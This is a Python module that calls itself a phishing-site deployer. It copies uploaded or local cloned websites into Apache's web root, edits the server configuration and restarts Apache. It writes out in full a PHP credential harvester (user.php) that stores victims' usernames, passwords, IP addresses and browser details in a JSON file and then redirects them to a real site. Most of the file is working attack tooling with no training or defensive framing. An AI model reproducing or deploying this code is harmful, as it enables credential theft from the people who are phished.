"""
Phishing Site Module
Configures Apache to serve a phishing website
"""

import os
import shutil
import subprocess
import json
import uuid
import zipfile
import tempfile


APACHE_CONF_PATH = "/etc/apache2/sites-available/000-default.conf"
USER_PHP_SOURCE = "./assets/user.php"
UPLOAD_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "uploads"))

def get_folder_name(path):
    """Extract the folder name from a path"""
    return os.path.basename(os.path.normpath(path))

def find_unique_filename(target_path):
    """Generate unique filename if path already exists"""
    if not os.path.exists(target_path):
        return target_path
    
    base_name, extension = os.path.splitext(target_path)
    counter = 2
    
    # Try with numeric suffix
    while os.path.exists(f"{base_name}{counter}{extension}"):
        counter += 1
    
    return f"{base_name}{counter}{extension}"

def get_php_version():
    """Detect the installed PHP version"""
    try:
        output = subprocess.check_output("php -v", shell=True).decode()
        version_line = output.splitlines()[0]
        version = version_line.split()[1]  # e.g., '8.3.6'
        major_minor = ".".join(version.split(".")[:2])  # '8.3'
        return major_minor
    except Exception as e:
        return None

def create_default_user_php():
    """Create a default user.php file if it doesn't exist"""
    os.makedirs(os.path.dirname(USER_PHP_SOURCE), exist_ok=True)
    
    if not os.path.exists(USER_PHP_SOURCE):
        default_content = """<?php
// Save captured credentials
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if ($username || $password) {
    $credentials = [
        'id' => uniqid(),
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    
    $creds_file = 'creds.json';
    $creds = [];
    
    if (file_exists($creds_file)) {
        $creds = json_decode(file_get_contents($creds_file), true) ?: [];
    }
    
    $creds[] = $credentials;
    file_put_contents($creds_file, json_encode($creds, JSON_PRETTY_PRINT));
}

// Redirect to the original site
header('Location: ' . (isset($_POST['redirect']) ? $_POST['redirect'] : 'https://google.com'));
exit;
?>
"""
        with open(USER_PHP_SOURCE, "w") as f:
            f.write(default_content)

def copy_to_var_www(local_path, target_folder_name):
    """Copy the phishing site to the webserver root"""
    target_path = f"/var/www/html/{target_folder_name}"
    try:
        if os.path.exists(target_path):
            shutil.rmtree(target_path)
        
        contents = os.listdir(local_path)
        if len(contents) == 1 and os.path.isdir(os.path.join(local_path, contents[0])):
            # Use contents of that inner folder as root
            inner_path = os.path.join(local_path, contents[0])
            shutil.copytree(inner_path, target_path)
        else:
            shutil.copytree(local_path, target_path)
        
        # Ensure user.php exists
        create_default_user_php()
        
        # Copy user.php
        user_php_target = os.path.join(target_path, "user.php")
        shutil.copy(USER_PHP_SOURCE, user_php_target)
        
        # Set permissions
        subprocess.call(["sudo", "chmod", "644", user_php_target])
        subprocess.call(["sudo", "chown", "-R", "www-data:www-data", target_path])
        
        return {
            "status": "success",
            "message": f"Folder copied to {target_path}",
            "path": target_path
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to copy site: {str(e)}"
        }

def update_apache_config(new_docroot):
    """Update Apache configuration with clean URLs, file restrictions, and enable rewrite module."""
    php_version = get_php_version()

    if not php_version:
        return {
            "status": "warning",
            "message": "Could not detect PHP version. Skipping PHP config."
        }

    try:
        # Read existing config
        with open(APACHE_CONF_PATH, 'r') as file:
            lines = file.readlines()

        # Update DocumentRoot
        with open(APACHE_CONF_PATH, 'w') as file:
            for line in lines:
                if line.strip().startswith("DocumentRoot"):
                    file.write(f"    DocumentRoot {new_docroot}\n")
                else:
                    file.write(line)

        # Config blocks
        extra_config = f"""
<IfModule php{php_version}_module>
    AddType application/x-httpd-php .php
    AddHandler application/x-httpd-php .php
    DirectoryIndex index.php index.html
</IfModule>

<Directory {new_docroot}>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted

    <FilesMatch "\\.(json|txt|env|log|cfg|ini|bak|old|sql)$">
        Require all denied
    </FilesMatch>
</Directory>
"""

        rewrite_rules = """
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ /index.php [L]
</IfModule>
"""

        # Append if not already there
        with open(APACHE_CONF_PATH, 'r') as file:
            content = file.read()

        with open(APACHE_CONF_PATH, 'a') as file:
            if f"<IfModule php{php_version}_module>" not in content:
                file.write(extra_config)
            if "<IfModule mod_rewrite.c>" not in content:
                file.write(rewrite_rules)

        # Enable rewrite module and restart Apache
        subprocess.call(["sudo", "a2enmod", "rewrite"])
        subprocess.call(["sudo", "systemctl", "restart", "apache2"])

        return {
            "status": "success",
            "message": f"Apache config updated, mod_rewrite enabled, and Apache restarted."
        }

    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to update Apache config: {str(e)}"
        }

def restart_apache():
    """Restart the Apache web server"""
    try:
        subprocess.call(["sudo", "systemctl", "restart", "apache2"])
        return {
            "status": "success",
            "message": "Apache restarted successfully"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to restart Apache: {str(e)}"
        }

def process_uploaded_file(file_path, domain_name):
    """Process an uploaded file (zip or directory) and copy to target location"""
    # Create uploads directory if it doesn't exist
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    
    # Create a unique temp directory
    temp_dir = os.path.join(UPLOAD_DIR, f"temp_{uuid.uuid4().hex}")
    os.makedirs(temp_dir, exist_ok=True)
    
    try:
        if zipfile.is_zipfile(file_path):
            # Extract zip file
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            # Check if zip contains a single root folder
            contents = os.listdir(temp_dir)
            if len(contents) == 1 and os.path.isdir(os.path.join(temp_dir, contents[0])):
                # Use the root folder from the zip
                extracted_dir = os.path.join(temp_dir, contents[0])
            else:
                # Use the temp directory directly
                extracted_dir = temp_dir
        else:
            # Just copy the file to the temp directory
            filename = os.path.basename(file_path)
            target_file = os.path.join(temp_dir, filename)
            shutil.copy2(file_path, target_file)
            extracted_dir = temp_dir
        
        # Return the path to the extracted/copied content
        return {
            "status": "success",
            "message": "File processed successfully",
            "path": extracted_dir
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to process uploaded file: {str(e)}"
        }

def setup_phishing_site_uploaded_multiple(file_paths, domain_name):
    """
    Upload and deploy phishing site with multiple files.
    Only final zip will be saved. Temp uploaded files will be cleaned.
    """
    results = {
        "domain": domain_name,
        "file_paths": file_paths,
        "steps": [],
        "status": "success"
    }

    try:
        domain_slug = domain_name.replace(".", "_")
        target_path = f"/var/www/html/{domain_slug}"

        # Create target folder if not exists
        if not os.path.exists(target_path):
            os.makedirs(target_path)

        # Create temporary directory
        temp_upload_dir = tempfile.mkdtemp(prefix="uploads_batch_")

        # Copy uploaded files to temp folder
        for file_path in file_paths:
            fname = os.path.basename(file_path)
            temp_dest = os.path.join(temp_upload_dir, fname)
            shutil.copy2(file_path, temp_dest)

        # Now process from temp folder
        for file_name in os.listdir(temp_upload_dir):
            full_temp_path = os.path.join(temp_upload_dir, file_name)
            
            if zipfile.is_zipfile(full_temp_path):
                # Unzip manually file by file
                with zipfile.ZipFile(full_temp_path, 'r') as zip_ref:
                    for member in zip_ref.infolist():
                        original_name = os.path.basename(member.filename)
                        if not original_name:
                            continue

                        target_file = os.path.join(target_path, original_name)

                        # Rename if file exists
                        if os.path.exists(target_file):
                            base, ext = os.path.splitext(original_name)
                            counter = 2
                            while os.path.exists(os.path.join(target_path, f"{base}{counter}{ext}")):
                                counter += 1
                            target_file = os.path.join(target_path, f"{base}{counter}{ext}")

                        with zip_ref.open(member) as source, open(target_file, "wb") as target:
                            shutil.copyfileobj(source, target)

                        results["steps"].append({"name": "unzip_file", "file": os.path.basename(target_file)})
            else:
                # Normal file
                dest = os.path.join(target_path, file_name)

                # Rename if already exists
                if os.path.exists(dest):
                    base, ext = os.path.splitext(file_name)
                    counter = 2
                    while os.path.exists(os.path.join(target_path, f"{base}{counter}{ext}")):
                        counter += 1
                    dest = os.path.join(target_path, f"{base}{counter}{ext}")

                shutil.copy2(full_temp_path, dest)
                results["steps"].append({"name": "copy_file", "file": os.path.basename(dest)})

        # Always add user.php
        create_default_user_php()
        user_php_target = os.path.join(target_path, "user.php")
        shutil.copy2(USER_PHP_SOURCE, user_php_target)
        subprocess.call(["sudo", "chmod", "644", user_php_target])
        subprocess.call(["sudo", "chown", "-R", "www-data:www-data", target_path])

        # Finally, create a zip of target folder inside uploads
        uploads_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "uploads"))
        zip_base_path = os.path.join(uploads_dir, domain_slug)
        zip_full_path = shutil.make_archive(zip_base_path, 'zip', target_path)
        results["steps"].append({"name": "zip_folder", "saved_zip": zip_full_path})

        # Update Apache config and restart
        cfg = update_apache_config(target_path)
        results["steps"].append({"name": "update_apache_config", "result": cfg})

        rst = restart_apache()
        results["steps"].append({"name": "restart_apache", "result": rst})

        results["final_path"] = target_path

        # ✅ Cleanup: Remove temp upload folder after success
        shutil.rmtree(temp_upload_dir)

        return results

    except Exception as e:
        return {
            "domain": domain_name,
            "file_paths": file_paths,
            "status": "error",
            "message": str(e)
        }


def setup_phishing_site_folder(folder_path, domain_name=None):
    """Setup a phishing site from a local folder"""
    # If domain name is provided, use it for folder name
    if domain_name:
        folder_name = domain_name.replace(".", "_")
    else:
        folder_name = get_folder_name(folder_path)
    
    results = {
        "folder_path": folder_path,
        "steps": [],
        "status": "success"
    }
    
    # Validate the folder path
    if not os.path.isdir(folder_path):
        results["status"] = "error"
        results["message"] = "Invalid path. Make sure the folder exists."
        return results
    
    # Step 1: Copy the site to /var/www/html
    copy_result = copy_to_var_www(folder_path, folder_name)
    results["steps"].append({"name": "copy_to_var_www", "result": copy_result})
    
    if copy_result["status"] == "error":
        results["status"] = "error"
        results["message"] = copy_result["message"]
        return results
    
    # Step 2: Update Apache config
    final_path = copy_result["path"]
    results["final_path"] = final_path
    
    config_result = update_apache_config(final_path)
    results["steps"].append({"name": "update_apache_config", "result": config_result})
    
    # Step 3: Restart Apache
    restart_result = restart_apache()
    results["steps"].append({"name": "restart_apache", "result": restart_result})
    
    if restart_result["status"] == "error":
        results["status"] = "error"
        results["message"] = restart_result["message"]
    
    return results